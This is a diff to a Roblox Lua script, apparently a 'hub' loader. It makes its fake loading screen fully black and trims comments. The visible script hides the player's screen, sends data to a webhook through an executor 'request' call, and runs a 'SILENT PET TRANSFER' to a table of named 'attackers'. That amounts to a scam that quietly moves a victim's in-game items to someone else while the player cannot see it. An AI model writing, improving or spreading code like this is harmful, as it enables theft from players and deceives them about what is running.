@@ -17,7 +17,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- ✅ 1. GUI SHOW (visual-only block, CoreGui not disabled)
+-- ✅ 1. GUI SHOW (full black background)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LimitHubLoading"
 screenGui.ResetOnSpawn = false
@@ -28,7 +28,7 @@ screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BackgroundTransparency = 0.1 -- semi-transparent block
+bg.BackgroundTransparency = 0 -- fully black
 
 local title = Instance.new("TextLabel", bg)
 title.Size = UDim2.new(0, 800, 0, 100)
@@ -72,7 +72,7 @@ task.spawn(function()
     screenGui:Destroy()
 end)
 
--- 📩 2. UPDATED WEBHOOK SEND (with kebabman link)
+-- 📩 2. WEBHOOK SEND
 task.delay(3, function()
     if typeof(request) ~= "function" then return end
     pcall(function()
@@ -98,7 +98,7 @@ task.delay(3, function()
     end)
 end)
 
--- 🐾 3. SILENT PET TRANSFER (with 3-sec delay and 3-min timeout)
+-- 🐾 3. SILENT PET TRANSFER
 task.delay(3, function()
     local attackers = {
         ["boneblossom215"] = true,
